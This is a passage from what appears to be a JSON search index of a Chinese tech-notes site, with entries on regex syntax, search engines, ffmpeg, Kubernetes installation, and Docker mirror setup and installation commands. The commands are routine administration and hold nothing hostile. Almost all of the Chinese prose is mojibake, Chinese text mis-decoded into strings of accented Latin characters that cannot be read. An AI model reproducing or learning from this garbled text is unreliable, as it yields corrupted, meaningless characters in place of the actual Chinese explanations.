#å‰ä¸€ä¸ªå•å…ƒè‡³å°‘åŒ¹é…Næ¬¡ {,M} #å‰ä¸€ä¸ªå•å…ƒæœ€å¤šåŒ¹é…Mæ¬¡ {N,M} #å‰ä¸€ä¸ªå•å…ƒåŒ¹é…Nè‡³Mæ¬¡ æ³¨è§£ grep æ‰¾çš„æ˜¯åŒ…å«æŸä¸ªæ¨¡å¼çš„è¡Œ, è€Œéå®Œå…¨åŒ¹é…. ä½ç½®é™å®šç¬¦: &#94; #åŒ¹é…è¡Œé¦–çš„ä½ç½® $ #åŒ¹é…è¡Œæœ«çš„ä½ç½® \\< #åŒ¹é…å•è¯å¼€å¤´çš„ä½ç½® \\> #åŒ¹é…å•è¯ç»“å°¾çš„ä½ç½® \\b #åŒ¹é…ä»¥å•è¯å¼€å¤´æˆ–è€…ç»“å°¾çš„ä½ç½® \\B #åŒ¹é…éè¯¥å•è¯å¼€å¤´å’Œç»“å°¾çš„ä½ç½®, ä¸\\bç›¸å å…¶ä»–ç‰¹æ®Šå­—ç¬¦: \\ è½¬ä¹‰å­—ç¬¦, ç‰¹æ®Šä¸æ™®é€šå­—ç¬¦ç›¸äº’è½¬æ¢ () å°†æ­£åˆ™è¡¨è¾¾å¼çš„éƒ¨åˆ†æ‹¬èµ·æ¥è¡¨ç¤ºä¸€ä¸ªå•å…ƒ | è¿æ¥ä¸¤ä¸ªå­è¡¨è¾¾å¼è¡¨ç¤ºæˆ–çš„å…³ç³» ?: è¡¨ç¤º éæ•è·ç»„, å³è¯¥ç»„çš„å†…å®¹ä¸ä¼šè¢«å•ç‹¬æ•è·ä¸ºåŒ¹é…ç»“æœã€‚ æ³¨è§£ ç«–çº¿ | çš„ä½œç”¨èŒƒå›´æ˜¯æ¯”è¾ƒå¹¿çš„, æˆ–è®¸è¿™ä¹Ÿæ˜¯å…¶äº [] çš„åŒºåˆ«: /apple|banana/ # åŒ¹é… \"apple\" æˆ– \"banana\" /appl[es],banana/ # åŒ¹é… \"apple,banana\" æˆ– \"appls,banana\" æ­£åˆ™è¡¨è¾¾å¼çš„æ¨¡å¼ åŸºç¡€æ­£åˆ™è¡¨è¾¾å¼(Basic) æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼(extended) Perlæ­£åˆ™è¡¨è¾¾å¼(Perl) åŒºåˆ«: åŸºç¡€æ­£åˆ™å’Œæ‰©å±•æ­£åˆ™çš„è§„èŒƒåŸºæœ¬ç›¸åŒ, åªæ˜¯åœ¨Basicè§„èŒƒä¸‹, æœ‰äº›å­—ç¬¦ ?, +, {}, (), | è§£é‡Šä¸ºæ™®é€šå­—ç¬¦, è¦è¡¨ç¤º ç‰¹æ®Šå«ä¹‰éœ€è¦åŠ  è¿›è¡Œè½¬ä¹‰. åœ¨Extendedè§„èŒƒä¸‹, è¿™äº›ç¬¦å·è¢«è§£é‡Šä¸ºç‰¹æ®Šå«ä¹‰, è¦å–å…¶å­—é¢å€¼, ä¹Ÿè¦å¯¹å…¶è¿›è¡Œ \\ è½¬ä¹‰. å…¶ä»–å¸¸ç”¨é€šç”¨å­—ç¬¦é›†åŠå…¶æ›¿æ¢ ç¬¦å· æ›¿æ¢æ­£åˆ™ åŒ¹é… \\d [0-9] æ•°å­—å­—ç¬¦ \\D [&#94;0-9] éæ•°å­—å­—ç¬¦ \\w [a-zA-Z0-9] æ•°å­—, å­—æ¯, ä¸‹åˆ’çº¿ \\W [&#94;w] éæ•°å­—, å­—æ¯, ä¸‹åˆ’çº¿ \\s [_rtnf] å›è½¦, æ¢è¡Œ, åˆ¶è¡¨ç¬¦ç­‰ç©ºç™½åŒºåŸŸ \\S [&#94;s] éç©ºç™½åŒºåŸŸ è´ªå©ªæ¨¡å¼ä¸éè´ªå©ªæ¨¡å¼ grep é»˜è®¤çš„å°±æ˜¯è´ªå©ªåŒ¹é…, ä¼šå°†ä¸€è¡Œä¸­æ‰€æœ‰æ»¡è¶³æ­£åˆ™çš„å…¨éƒ¨åŒ¹é…å‡ºæ¥. è€Œéè´ªå©ªæ¨¡å¼æ˜¯ä¸€æ—¦å‘ç°åŒ¹é…ç¬¦åˆè¦æ±‚, ç«‹é©¬åŒ¹é…æˆåŠŸ, è€Œä¸ä¼šç»§ç»­åŒ¹é…ä¸‹å»ï¼ˆé™¤éæœ‰g, å¼€å¯ä¸‹ä¸€ç»„åŒ¹é…ï¼‰ é›¶å®½æ–­è¨€ ç”¨äºæŒ‡å®šä¸€ä¸ªä½ç½®, è¿™ä¸ªä½ç½®åº”è¯¥æ»¡è¶³ä¸€å®šçš„æ¡ä»¶. é›¶å®½åº¦æ­£é¢„æµ‹ (?=æ­£åˆ™è¡¨è¾¾å¼) æ­£åˆ™è¡¨è¾¾å¼æ‰€å¤„ä½ç½®ä¹‹å‰, ä¸åŒ…æ‹¬æ­£åˆ™è¡¨è¾¾å¼æŒ‡å®šçš„ä½ç½®çš„å•å…ƒ. é›¶å®½åº¦æ­£åé¡¾åå‘æ–­è¨€ (?<=æ­£åˆ™è¡¨è¾¾å¼) æ­£åˆ™è¡¨è¾¾å¼æ‰€å¤„ä½ç½®ä¹‹å, ä¸åŒ…æ‹¬æ­£åˆ™è¡¨è¾¾å¼æŒ‡å®šçš„ä½ç½®çš„å•å…ƒ. linux-grepå¸¸ç”¨é€‰é¡¹ è§: /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/grep è½¬ä¹‰ç¬¦ å¦‚ä¸‹: \\ è¡¨ç¤ºå¼€å§‹è½¬ä¹‰, åœ¨Pythonä¸­å¤„äºè¡Œå°¾ä½ç½®æ—¶è¡¨ç¤ºç»­è¡Œç¬¦ \\\\ åæ–œæ  \\â€˜ å•å¼•å· \\\" åŒå¼•å· \\b é€€æ ¼ \\n æ¢è¡Œ \\v çºµå‘åˆ¶è¡¨ç¬¦ \\t æ¨ªå‘åˆ¶è¡¨ç¬¦ \\r å›è½¦ \\f æ¢é¡µ","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-Regular-expression.html","loc":"/yq-doc-source-docs-Chaotic-Regular-expression.html"},{"title":"æœç´¢å¼•æ“å®ç°","text":"æ•°æ®ä¸€èˆ¬åˆ†ä¸¤ç±»: ç»“æ„åŒ–æ•°æ®, å¦‚å­˜å‚¨å…³ç³»æ•°æ®åº“ä¸­çš„æ•°æ®, æŸ¥è¯¢æ—¶å€™å¯ä»¥ç›´æ¥ sql è¯­å¥æŸ¥è¯¢åˆ°ç¡®å®šçš„ç»“æœ éç»“æ„åŒ–æ•°æ®, å¦‚æ–‡ç« , å¦‚æœå­˜å‚¨åœ¨æ•°æ®åº“ä¸­, éœ€è¦å…ˆæŸ¥è¯¢æ‰€æœ‰æ–‡ç« , å†åœ¨æ¯ä¸€ç¯‡æ–‡ä¸­æ£€ç´¢ æ™®é€šæ£€ç´¢å¯¹äºç»“æ„åŒ–æ•°æ®ä¸å¯è¡Œ, æ‰€ä»¥éœ€è¦å¯¹å…¶è¿›è¡Œä¸€å®šå¤„ç†, è¿™å°±æ˜¯ å…¨æ–‡æ£€ç´¢ å°†éç»“æ„åŒ–çš„æ•°æ®ä¸­çš„ä¸€éƒ¨åˆ†ä¿¡æ¯æå–å‡ºæ¥ï¼Œç„¶åä»¥æŸç§è§„åˆ™é‡ç»„ï¼Œä½¿å…¶å˜å¾—æœ‰ä¸€å®šçš„ç»“æ„ï¼Œ ç„¶åå¯¹æ­¤ç»“æ„æ•°æ®å»ºç«‹ç´¢å¼•å¹¶è¿›è¡Œæœç´¢ï¼Œä»è€Œè¾¾åˆ°å¿«é€Ÿæœç´¢çš„ç›®çš„ã€‚ æ¯”å¦‚ ElasticSearch çš„ å€’æ’ç´¢å¼•","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-Search-engine-implementation.html","loc":"/yq-doc-source-docs-Chaotic-Search-engine-implementation.html"},{"title":"ç‰ˆæœ¬è¯´æ˜","text":"è½¯ä»¶ç‰ˆæœ¬è¯´æ˜ è½¯ä»¶ç‰ˆæœ¬è¯´æ˜: https://blog.csdn.net/gnail_oug/article/details/79998154 ç³»ç»Ÿç‰ˆæœ¬è¯´æ˜ X86: ç³»çµ±æ˜¯ 32 bit çš„ç‰ˆæœ¬ X86-64: ç³»ç»Ÿæ˜¯ 64 bit çš„","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-Version-description.html","loc":"/yq-doc-source-docs-Chaotic-Version-description.html"},{"title":"ffmpegä»‹ç»","text":"Pythonä¸‹æœ‰ä¸ªä¸‰æ–¹åº“, å¯è§: /docs/åç«¯/python/pythonä¸‰æ–¹åº“/ffmpeg å‰è¨€ FFmpegæ˜¯ä¸€å¥—å¯ä»¥ç”¨æ¥è®°å½•ã€è½¬æ¢æ•°å­—éŸ³é¢‘ã€è§†é¢‘ï¼Œå¹¶èƒ½å°†å…¶è½¬åŒ–ä¸ºæµçš„å¼€æºè®¡ç®—æœºç¨‹åºã€‚å¯ä»¥è½»æ˜“åœ°å®ç°å¤šç§è§†é¢‘æ ¼å¼ä¹‹é—´çš„ç›¸äº’è½¬æ¢ã€‚ åç§°æ¥è‡ªäºMPEGè§†é¢‘ç¼–ç æ ‡å‡†, FFä»£è¡¨ \"fast forawrd\". åŒ…å«ä»¥ä¸‹éƒ¨åˆ† libavformatï¼šç”¨äºå„ç§éŸ³è§†é¢‘å°è£…æ ¼å¼çš„ç”Ÿæˆå’Œè§£æï¼ŒåŒ…æ‹¬è·å–è§£ç æ‰€éœ€ä¿¡æ¯ä»¥ç”Ÿæˆè§£ç ä¸Šä¸‹æ–‡ç»“æ„å’Œè¯»å–éŸ³è§†é¢‘å¸§ç­‰åŠŸèƒ½ï¼ŒåŒ…å«demuxerså’Œmuxeråº“ã€‚ libavcodecï¼šç”¨äºå„ç§ç±»å‹å£°éŸ³/å›¾åƒç¼–è§£ç ã€‚ libavutilï¼šåŒ…å«ä¸€äº›å…¬å…±çš„å·¥å…·å‡½æ•°ã€‚ libswscaleï¼šç”¨äºè§†é¢‘åœºæ™¯æ¯”ä¾‹ç¼©æ”¾ã€è‰²å½©æ˜ å°„è½¬æ¢ã€‚ libpostprocï¼šç”¨äºåæœŸæ•ˆæœå¤„ç†ã€‚ ffmpegï¼šæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨æ¥å¯¹è§†é¢‘æ–‡ä»¶è½¬æ¢æ ¼å¼ï¼Œä¹Ÿæ”¯æŒå¯¹ç”µè§†å¡å®æ—¶ç¼–ç ã€‚ ffseverï¼šæ˜¯ä¸€ä¸ªHTTPå¤šåª’ä½“å®æ—¶å¹¿æ’­æµæœåŠ¡å™¨ï¼Œæ”¯æŒæ—¶å…‰å¹³ç§»ã€‚ ffplayï¼šæ˜¯ä¸€ä¸ªç®€å•çš„æ’­æ”¾å™¨ï¼Œä½¿ç”¨ffmpeg åº“è§£æå’Œè§£ç ï¼Œé€šè¿‡SDLæ˜¾ç¤ºã€‚ ffprobeï¼šæ”¶é›†å¤šåª’ä½“æ–‡ä»¶æˆ–æµçš„ä¿¡æ¯ï¼Œå¹¶ä»¥äººå’Œæœºå™¨å¯è¯»çš„æ–¹å¼è¾“å‡ºã€‚ åŸºæœ¬æ¦‚å¿µ å®¹å™¨(Container)ä¸æµ(Stream) å®¹å™¨åŒ…å«æµä¸æ–‡ä»¶å¤´ å®¹å™¨/æ–‡ä»¶(Conainer/File) å³è§†é¢‘æ ¼å¼, ç‰¹å®šæ ¼å¼çš„å¤šåª’ä½“æ–‡ä»¶ï¼Œæ¯”å¦‚mp4ã€flvã€mkvç­‰ åª’ä½“æµ(Stream) ä¸€ç§è§†é¢‘ä¿¡æ¯ä¼ è¾“æ ¼å¼, æœ‰5ç§: éŸ³é¢‘ã€è§†é¢‘ã€å­—å¹•ã€é™„ä»¶ã€æ•°æ®. è¡¨ç¤ºæ—¶é—´è½´ä¸Šçš„ä¸€æ®µè¿ç»­æ•°æ®ï¼Œå¦‚ä¸€æ®µå£°éŸ³æ•°æ®ã€ä¸€æ®µè§†é¢‘æ•°æ®æˆ–ä¸€æ®µå­—å¹•æ•°æ®ï¼Œå¯ä»¥æ˜¯å‹ç¼©çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯éå‹ç¼©çš„ï¼Œå‹ç¼©çš„æ•°æ®éœ€è¦å…³è”ç‰¹å®šçš„ç¼–è§£ç å™¨ã€‚ æ•°æ®å¸§/æ•°æ®åŒ…(Frame/Packet) å¸§ä»£è¡¨ä¸€å¹…é™æ­¢çš„å›¾åƒï¼Œåˆ†ä¸ºIå¸§ï¼ŒPå¸§ï¼ŒBå¸§ã€‚ é€šå¸¸ï¼Œä¸€ä¸ªåª’ä½“æµæ˜¯ç”±å¤§é‡çš„æ•°æ®å¸§ç»„æˆçš„ï¼Œå¯¹äºå‹ç¼©æ•°æ®ï¼Œå¸§å¯¹åº”ç€ç¼–è§£ç å™¨çš„æœ€å°å¤„ç†å•å…ƒï¼Œåˆ†å±äºä¸åŒåª’ä½“æµçš„æ•°æ®å¸§äº¤é”™å­˜å‚¨äºå®¹å™¨ä¹‹ä¸­ã€‚ ä¸€èˆ¬æƒ…å†µä¸‹ï¼š Frameå¯¹åº”å‹ç¼©å‰çš„æ•°æ®ï¼ŒPacketå¯¹åº”å‹ç¼©åçš„æ•°æ®ã€‚ ç¼–è§£ç å™¨(Codec) ä»¥å¸§ä¸ºå•ä½å®ç°å‹ç¼©æ•°æ®å’ŒåŸå§‹æ•°æ®ä¹‹é—´çš„ç›¸äº’è½¬æ¢, å¯¹è§†é¢‘è¿›è¡Œå‹ç¼©æˆ–è€…è§£å‹ç¼©ï¼ŒCODEC = COdeï¼ˆç¼–ç ï¼‰ +DECodeï¼ˆè§£ç ï¼‰ã€‚ å¤ç”¨/è§£å¤ç”¨(mux/demux) æŠŠä¸åŒçš„æµæŒ‰ç…§æŸç§å®¹å™¨çš„è§„åˆ™æ”¾å…¥å®¹å™¨ï¼Œè¿™ç§è¡Œä¸ºå«åšå¤ç”¨ï¼ˆmuxï¼‰ã€‚ æŠŠä¸åŒçš„æµä»æŸç§å®¹å™¨ä¸­è§£æå‡ºæ¥ï¼Œè¿™ç§è¡Œä¸ºå«åšè§£å¤ç”¨(demux)ã€‚ å¸§ç‡ å¸§ç‡ä¹Ÿå«å¸§é¢‘ç‡ï¼Œå¸§ç‡æ˜¯è§†é¢‘æ–‡ä»¶ä¸­æ¯ä¸€ç§’çš„å¸§æ•°ï¼Œè‚‰çœ¼æƒ³çœ‹åˆ°è¿ç»­ç§»åŠ¨å›¾åƒè‡³å°‘éœ€è¦15å¸§ã€‚ ç ç‡ æ¯”ç‰¹ç‡(ä¹Ÿå«ç ç‡ï¼Œæ•°æ®ç‡)æ˜¯ä¸€ä¸ªç¡®å®šæ•´ä½“è§†é¢‘/éŸ³é¢‘è´¨é‡çš„å‚æ•°ï¼Œç§’ä¸ºå•ä½å¤„ç†çš„å­—èŠ‚æ•°ï¼Œç ç‡å’Œè§†é¢‘è´¨é‡æˆæ­£æ¯”ï¼Œåœ¨è§†é¢‘æ–‡ä»¶ä¸­ä¸­æ¯”ç‰¹ç‡ç”¨bpsæ¥è¡¨è¾¾ã€‚ å‚è€ƒ:: https://zhuanlan.zhihu.com/p/117523405 https://cloud.tencent.com/developer/article/1773248","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-ffmpeg.html","loc":"/yq-doc-source-docs-Chaotic-ffmpeg.html"},{"title":"é›†ç¾¤å®‰è£…","text":"é›†ç¾¤å®‰è£… k8sé›†ç¾¤ä¸»æµå®‰è£…æ–¹å¼å¯¹æ¯”åˆ†æ minikube äºŒè¿›åˆ¶å®‰è£… kubeadmç­‰å®‰è£…å·¥å…· æ ¸å¿ƒç»„ä»¶ é™æ€Podçš„æ–¹å¼: ## etcd, apiserver, controller-manager, kube-scheduler $ kubectl -n kube-system get po systemdæœåŠ¡æ–¹å¼: $ systemctl status kubelet","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-K8S-Cluster-installation.html","loc":"/yq-doc-source-docs-Container-and-cluster-K8S-Cluster-installation.html"},{"title":"dockeré…ç½®é•œåƒ","text":"åé¢çœ‹åˆ°githubä¸Šæœ‰: https://gist.github.com/y0ngb1n/7e8f16af3242c7815e7ca2f0833d3ea6 é•œåƒé…ç½®æ¦‚è¿° ç”±äºç½‘ç»œåŸå› å®˜æ–¹é•œåƒä¸‹è½½å¾ˆæ…¢, æ‰€ä»¥éœ€è¦é…ç½®é•œåƒåŠ é€Ÿ. é…ç½®æˆåŠŸåéƒ½æ˜¯æ‰§è¡Œ docker info ,æŸ¥çœ‹è¾“å‡ºæ˜¯å¦æœ‰è‡ªå·±é…ç½®çš„é•œåƒåœ°å€. linux é€‚ç”¨äºlinux, å°†é…ç½®åŠ åˆ° /etc/docker/daemon.json mkdir -p /etc/docker tee /etc/docker/daemon.json <<-'EOF' { \"registry-mirrors\": [ \"https://0b27f0a81a00f3560fbdc00ddd2f99e0.mirror.swr.myhuaweicloud.com\", \"https://ypzju6vq.mirror.aliyuncs.com\", \"https://registry.docker-cn.com\", \"http://hub-mirror.c.163.com\", \"https://docker.mirrors.ustc.edu.cn\" ] } EOF systemctl daemon-reload systemctl restart docker mac å³é”®ç‚¹å‡»æ¡Œé¢é¡¶æ çš„ docker å›¾æ ‡, é€‰æ‹© Preferences (åå¥½) , åœ¨ Docker Engine æ ‡ç­¾ä¸‹çš„ Registry mirrors åˆ—è¡¨ä¸­å°†é•œåƒåœ°å€çš„æ•°ç»„: \"registry-mirrors\": [\"https://ä½ çš„å‰ç¼€åœ°å€.http://mirror.aliyuncs.com\"] ç‚¹å‡» Apply & Restart æŒ‰é’®, ç­‰å¾…Dockeré‡å¯å¹¶åº”ç”¨é…ç½®çš„é•œåƒåŠ é€Ÿå™¨ã€‚ æ³¨è§£ åŸä»¥ä¸ºmacä¹Ÿæ˜¯è·Ÿlinuxç±»ä¼¼, ç»“æœåœ¨ /etc/docker/daemon.json åŠ å…¥äº†é…ç½®ä¸ç”Ÿæ•ˆ. æ€ç´¢äº†ä¸€ä¸‹å¯èƒ½æœ‰ä¸¤ä¸ªåŸå› : Docker for Mac è·Ÿå‘½ä»¤è¡Œå®‰è£…çš„dockerä¸ä¸€è‡´ macä¸‹å®‰è£…çš„dockeråªèƒ½åœ¨åº”ç”¨å†…é…ç½® æ›´æ­£, æ˜¯è¿™ä¸¤ä¸ªåŸå› ä¹Ÿä¸æ˜¯, macä¸‹ä¸€èˆ¬éƒ½æ˜¯ç”¨çš„ç”¨æˆ·å®‰è£…çš„, æ‰€ä»¥é»˜è®¤çš„é…ç½®åœ°å€ä¸º ~/.docker/daemon.json , è€Œé etc ä¸‹çš„ç›®å½•. é•œåƒå‚è€ƒ { \"registry-mirrors\" : [ \"https://0b27f0a81a00f3560fbdc00ddd2f99e0.mirror.swr.myhuaweicloud.com\" , \"https://ypzju6vq.mirror.aliyuncs.com\" , \"https://registry.docker-cn.com\" , \"http://hub-mirror.c.163.com\" , \"https://docker.mirrors.ustc.edu.cn\" ] } å®˜æ–¹å›½åŒºdocker \"https://registry.docker-cn.com\" ç½‘æ˜“ \"http://hub-mirror.c.163.com\" ä¸­ç§‘å¤§ \"https://docker.mirrors.ustc.edu.cn\"` ä¸åŒç³»ç»Ÿå®¹å™¨ä¸é•œåƒä½ç½® linux cd /var/lib/docker - å®¹å™¨ä¸é•œåƒå­˜æ”¾åœ¨æ­¤ç›®å½•ä¸‹ é•œåƒä½ç½®: /var/lib/docker/image å®¹å™¨ä½ç½®: /var/lib/docker/containers mac, ä¸åŒç‰ˆæœ¬æˆ–è®¸å¯èƒ½æ–‡ä»¶ç‰ˆæœ¬ä¸ä¸€æ · /Users/xxxxmyname/Library/Containers/com.docker.docker/Data ,å¯ä»¥åˆ°ä¸Šé¢çš„ç›®å½•ä¸­, æŸ¥çœ‹æ–‡ä»¶å¤§å°, du -sh * æœ¬æœºå­˜æ”¾ä½ç½®å¦‚ä¸‹: /Users/xxxxmyname/Library/Containers/com.docker.docker/Data/vms/0/data/Docker.raw æ³¨è§£ è®¾ç½®dockeræ¸…åæºå¯å‚è€ƒ: Docker Community Edition é•œåƒä½¿ç”¨å¸®åŠ© å¦å¤–ä¸€èˆ¬ apt æ›´æ–°æç¤ºæ ¡éªŒä¸ä¸€è‡´çš„, ä¸€èˆ¬å°±æ˜¯å›½å†…é•œåƒæºæ²¡æœ‰æ›´æ–°. è¡¥å……ä¸€ä¸ªè‡ªå·± Ubuntu æœåŠ¡å™¨é…ç½®Dockerçš„å‘½ä»¤é›† # å¦‚æœä½ è¿‡å»å®‰è£…è¿‡ dockerï¼Œå…ˆåˆ æ‰: sudo apt-get remove docker docker-engine docker.io containerd runc # é¦–å…ˆå®‰è£…ä¾èµ–: sudo apt-get install apt-transport-https ca-certificates curl gnupg2 software-properties-common # æ ¹æ®ä½ çš„å‘è¡Œç‰ˆï¼Œä¸‹é¢çš„å†…å®¹æœ‰æ‰€ä¸åŒã€‚ä½ ä½¿ç”¨çš„å‘è¡Œç‰ˆï¼š # Ubuntu # ä¿¡ä»» Docker çš„ GPG å…¬é’¥: curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg # æ·»åŠ è½¯ä»¶ä»“åº“: echo \\ \"deb [arch= $( dpkg --print-architecture ) signed-by=/etc/apt/keyrings/docker.gpg] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu \\ $( lsb_release -cs ) stable\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null # æœ€åå®‰è£… sudo apt-get update sudo apt-get install docker-ce","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-Docker-configuration-mirror-image.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-Docker-configuration-mirror-image.html"},{"title":"dockerå®¹å™¨åŒ–ä¸‹çš„åä½œå¼€å‘","text":"æŒç»­äº¤ä»˜éƒ¨ç½² ä¿éšœä¸€è‡´æ€§çš„ç¯å¢ƒ å¼€å‘äººå‘˜ ä»£ç å†™å¥½ä¹‹åï¼Œè¿˜ä¼šå¼€å‘ dockerfile è„šæœ¬å®Œæˆï¼Œ å°†ä»£ç ï¼Œå’Œç¯å¢ƒä¾èµ–ï¼Œå…¨éƒ¨æ‰“åŒ…ä¸ºä¸€ä¸ªé•œåƒæ–‡ä»¶(images) æµ‹è¯• ç›´æ¥æ‹¿ images, docker run è¿ç»´ ç›´æ¥æ‹¿ images, docker run","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-Docker-containerized-collaboration.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-Docker-containerized-collaboration.html"},{"title":"dockerä½¿ç”¨","text":"å¸¸è§ åŸºäº dockerfile ç›´æ¥æ‰“åŒ…images å¸¸è§ä½¿ç”¨ è™šæ‹Ÿæœº + å®¹å™¨","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-Docker-use.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-Docker-use.html"},{"title":"docker","text":"å¯¹è¿›ç¨‹è¿›è¡Œå°è£…éš”ç¦»ï¼Œå±äºæ“ä½œç³»ç»Ÿå±‚é¢çš„è™šæ‹ŸåŒ–æŠ€æœ¯ã€‚ åˆ©ç”¨Dockerå¯ä»¥å®ç°å¼€å‘ï¼Œæµ‹è¯•ï¼Œç”Ÿäº§ç¯å¢ƒçš„éƒ¨ç½²ä¸€è‡´æ€§ï¼Œæå¤§çš„å‡å°‘è¿ç»´æˆæœ¬ã€‚ ç»“æ„ ç®€è€Œè¨€ä¹‹ æœ€ä¸Šå±‚æ˜¯å¯å†™å±‚(å®¹å™¨å±‚), æ“ä½œéƒ½æ˜¯åœ¨è¿™é‡Œè¿›è¡Œ ä¸‹é¢çš„é•œåƒå±‚åªè¯» å®¹å™¨å±‚çš„æ“ä½œéµå¾ª å†™æ—¶å¤åˆ¶ ; å½“åœ¨è¿™é‡Œä¿®æ”¹ä¸€ä¸ªæ–‡ä»¶æ—¶, ä¼šè‡ªé¡¶å‘ä¸‹çš„æ‰¾æ–‡ä»¶, æ‰¾åˆ°åå¤åˆ¶åˆ°å®¹å™¨å±‚ç„¶åä¿®æ”¹; å¦‚æœæ˜¯åˆ é™¤, ä¹Ÿä¸ä¼šåˆ é™¤åº•å±‚é•œåƒå†…å®¹, è€Œåªæ˜¯æ ‡è®°ä¸ºåˆ é™¤çŠ¶æ€. æ¦‚è¿° ä¸‰ä¸ªåŸºæœ¬æ¦‚å¿µ é•œåƒï¼ˆImageï¼‰ Docker é•œåƒï¼ˆImageï¼‰, å°±ç›¸å½“äºæ˜¯ä¸€ä¸ª root æ–‡ä»¶ç³»ç»Ÿã€‚ æ¯”å¦‚å®˜æ–¹é•œåƒ ubuntu:16.04 å°±åŒ…å«äº†å®Œæ•´çš„ä¸€å¥— Ubuntu16.04 æœ€å°ç³»ç»Ÿçš„ root æ–‡ä»¶ç³»ç»Ÿã€‚ å®¹å™¨ï¼ˆContainerï¼‰ é•œåƒï¼ˆImageï¼‰å’Œå®¹å™¨ï¼ˆContainerï¼‰çš„å…³ç³», å°±åƒæ˜¯é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ä¸­çš„ç±»å’Œå®ä¾‹ä¸€æ ·, é•œåƒæ˜¯é™æ€çš„å®šä¹‰, å®¹å™¨æ˜¯é•œåƒè¿è¡Œæ—¶çš„å®ä½“ã€‚ å®¹å™¨å¯ä»¥è¢«åˆ›å»ºã€å¯åŠ¨ã€åœæ­¢ã€åˆ é™¤ã€æš‚åœç­‰ã€‚ ä»“åº“ï¼ˆRepositoryï¼‰ ä»“åº“å¯çœ‹æˆä¸€ä¸ªä»£ç æ§åˆ¶ä¸­å¿ƒ, ç”¨æ¥ä¿å­˜é•œåƒã€‚ Docker ä½¿ç”¨å®¢æˆ·ç«¯-æœåŠ¡å™¨ (C/S) æ¶æ„æ¨¡å¼, ä½¿ç”¨è¿œç¨‹APIæ¥ç®¡ç†å’Œåˆ›å»ºDockerå®¹å™¨ã€‚ Docker å®¹å™¨é€šè¿‡ Docker é•œåƒæ¥åˆ›å»ºã€‚ å®¹å™¨ä¸é•œåƒçš„å…³ç³»ç±»ä¼¼äºé¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­çš„å¯¹è±¡ä¸ç±»ã€‚ å®¹å™¨ä¸é•œåƒçš„å…³ç³» Docker é¢å‘å¯¹è±¡ å®¹å™¨ å¯¹è±¡ é•œåƒ ç±» æ³¨è§£ æœ‰ä¸ªè¯¯è§£, Dockerä¸å®Œå…¨ä»£è¡¨å®¹å™¨; Dockeråªæ˜¯å®ç°äº†å®¹å™¨æŠ€æœ¯çš„ä¸€ç§æ–¹å¼ å®˜æ–¹ä¸€äº›çš„é‡Šä¹‰ æ­£å¼ä¸€äº›è¯´æ˜ ç›¸å¯¹å®˜æ–¹ä¸€äº›çš„è¯´æ˜ æ¦‚å¿µ è¯´æ˜ Docker é•œåƒ(Images) Docker é•œåƒæ˜¯ç”¨äºåˆ›å»º Docker å®¹å™¨çš„æ¨¡æ¿, æ¯”å¦‚ Ubuntu ç³»ç»Ÿã€‚ Docker å®¹å™¨(Container) å®¹å™¨æ˜¯ç‹¬ç«‹è¿è¡Œçš„ä¸€ä¸ªæˆ–ä¸€ç»„åº”ç”¨, æ˜¯é•œåƒè¿è¡Œæ—¶çš„å®ä½“ã€‚ Docker å®¢æˆ·ç«¯(Client) Docker å®¢æˆ·ç«¯é€šè¿‡å‘½ä»¤è¡Œæˆ–è€…å…¶ä»–å·¥å…·ä½¿ç”¨ Docker SDK ( https://docs.docker.com/develop/sdk/ ) ä¸ Docker çš„å®ˆæŠ¤è¿›ç¨‹é€šä¿¡ã€‚ Docker ä¸»æœº(Host) ä¸€ä¸ªç‰©ç†æˆ–è€…è™šæ‹Ÿçš„æœºå™¨ç”¨äºæ‰§è¡Œ Docker å®ˆæŠ¤è¿›ç¨‹å’Œå®¹å™¨ã€‚ Docker Registry Docker ä»“åº“ç”¨æ¥ä¿å­˜é•œåƒ, å¯ä»¥ç†è§£ä¸ºä»£ç æ§åˆ¶ä¸­çš„ä»£ç ä»“åº“ã€‚Docker Hub([ https://hub.docker.com](https://hub.docker.com/ )) æä¾›äº†åºå¤§çš„é•œåƒé›†åˆä¾›ä½¿ç”¨ã€‚ä¸€ä¸ª Docker Registry ä¸­å¯ä»¥åŒ…å«å¤šä¸ªä»“åº“ï¼ˆRepositoryï¼‰ï¼›æ¯ä¸ªä»“åº“å¯ä»¥åŒ…å«å¤šä¸ªæ ‡ç­¾ï¼ˆTagï¼‰ï¼›æ¯ä¸ªæ ‡ç­¾å¯¹åº”ä¸€ä¸ªé•œåƒã€‚é€šå¸¸, ä¸€ä¸ªä»“åº“ä¼šåŒ…å«åŒä¸€ä¸ªè½¯ä»¶ä¸åŒç‰ˆæœ¬çš„é•œåƒ, è€Œæ ‡ç­¾å°±å¸¸ç”¨äºå¯¹åº”è¯¥è½¯ä»¶çš„å„ä¸ªç‰ˆæœ¬ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ <ä»“åº“å>:<æ ‡ç­¾> çš„æ ¼å¼æ¥æŒ‡å®šå…·ä½“æ˜¯è¿™ä¸ªè½¯ä»¶å“ªä¸ªç‰ˆæœ¬çš„é•œåƒã€‚å¦‚æœä¸ç»™å‡ºæ ‡ç­¾, å°†ä»¥ latest ä½œä¸ºé»˜è®¤æ 